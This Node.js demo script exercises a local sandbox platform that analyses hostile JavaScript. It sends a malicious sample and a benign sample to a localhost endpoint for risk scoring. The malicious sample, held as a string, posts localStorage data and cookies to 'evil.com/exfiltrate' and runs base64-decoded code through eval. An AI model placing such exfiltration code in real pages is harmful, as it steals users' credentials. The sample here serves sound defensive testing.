#!/usr/bin/env node

// Hostile JS Playground - Demo Script
// This script demonstrates the full capabilities of the platform

const API_BASE = 'http://localhost:3002';

async function runDemo() {
  console.log('🛡️  HOSTILE JS PLAYGROUND - LIVE DEMO\n');

  // Test 1: Health Check
  console.log('1️⃣  Testing API Health...');
  try {
    const health = await fetch(`${API_BASE}/health`);
    const healthData = await health.json();
    console.log(`✅ API Status: ${healthData.status}`);
  } catch (error) {
    console.log('❌ API Health Check Failed:', error.message);
    return;
  }

  // Test 2: Sandbox Status
  console.log('\n2️⃣  Checking Sandbox Status...');
  try {
    const sandbox = await fetch(`${API_BASE}/api/sandbox/status`);
    const sandboxData = await sandbox.json();
    console.log(`✅ Sandbox: ${sandboxData.status}`);
    console.log(`   Capabilities: ${Object.keys(sandboxData.capabilities).length} features`);
  } catch (error) {
    console.log('❌ Sandbox Check Failed:', error.message);
  }

  // Test 3: Challenge System
  console.log('\n3️⃣  Loading Challenges...');
  try {
    const challenges = await fetch(`${API_BASE}/api/challenges`);
    const challengeData = await challenges.json();
    console.log(`✅ Challenges: ${challengeData.total} available`);
    challengeData.challenges.forEach((c, i) => {
      console.log(`   ${i+1}. ${c.title} (${c.difficulty})`);
    });
  } catch (error) {
    console.log('❌ Challenge Loading Failed:', error.message);
  }

  // Test 4: Malicious Code Analysis
  console.log('\n4️⃣  Analyzing Malicious Code...');
  
  const maliciousCode = `
// Multi-vector attack simulation
document.cookie = "stolen=credentials";
fetch("https://evil.com/exfiltrate", {
  method: "POST",
  body: JSON.stringify({
    data: localStorage.getItem("sensitive"),
    cookies: document.cookie
  })
});
eval(atob("Y29uc29sZS5sb2coJ21hbGljaW91cycpOw=="));
setInterval(() => { /* crypto mining */ }, 50);
performance.now(); // timing attack
  `;

  try {
    const analysis = await fetch(`${API_BASE}/api/analysis/execute`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: maliciousCode })
    });
    
    const result = await analysis.json();
    
    if (result.success) {
      console.log(`✅ Analysis Complete!`);
      console.log(`   🎯 Risk Score: ${result.result.riskScore}/100`);
      console.log(`   ⚡ Execution Time: ${result.result.executionTime}ms`);
      console.log(`   🚨 Threats Detected: ${result.result.behaviors.length}`);
      
      console.log('\n   📊 Threat Breakdown:');
      const severityCounts = result.result.behaviors.reduce((acc, b) => {
        acc[b.severity] = (acc[b.severity] || 0) + 1;
        return acc;
      }, {});
      
      Object.entries(severityCounts).forEach(([severity, count]) => {
        const emoji = {
          critical: '🔴',
          high: '🟠', 
          medium: '🟡',
          low: '🔵',
          info: '⚪'
        }[severity] || '⚫';
        console.log(`      ${emoji} ${severity.toUpperCase()}: ${count}`);
      });

      console.log('\n   🔍 Top Threats:');
      result.result.behaviors.slice(0, 5).forEach((behavior, i) => {
        console.log(`      ${i+1}. [${behavior.severity.toUpperCase()}] ${behavior.description}`);
      });
    }
  } catch (error) {
    console.log('❌ Code Analysis Failed:', error.message);
  }

  // Test 5: Benign Code Analysis
  console.log('\n5️⃣  Analyzing Benign Code...');
  
  const benignCode = `
// Safe JavaScript code
function calculateSum(a, b) {
  return a + b;
}

const result = calculateSum(5, 3);
console.log("Result:", result);

// Simple DOM interaction
const element = document.createElement('div');
element.textContent = 'Hello World';
  `;

  try {
    const analysis = await fetch(`${API_BASE}/api/analysis/execute`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: benignCode })
    });
    
    const result = await analysis.json();
    
    if (result.success) {
      console.log(`✅ Analysis Complete!`);
      console.log(`   🎯 Risk Score: ${result.result.riskScore}/100`);
      console.log(`   🚨 Threats Detected: ${result.result.behaviors.length}`);
      
      if (result.result.behaviors.length === 0) {
        console.log('   ✨ Code appears to be safe!');
      }
    }
  } catch (error) {
    console.log('❌ Benign Code Analysis Failed:', error.message);
  }

  console.log('\n🎉 DEMO COMPLETE!');
  console.log('\n📖 Next Steps:');
  console.log('   • Open http://localhost:5173 in your browser');
  console.log('   • Try the interactive code editor');
  console.log('   • Explore the challenge mode');
  console.log('   • Experiment with different malicious patterns');
  console.log('\n🛡️  Happy Security Testing!');
}

// Run the demo
runDemo().catch(console.error);
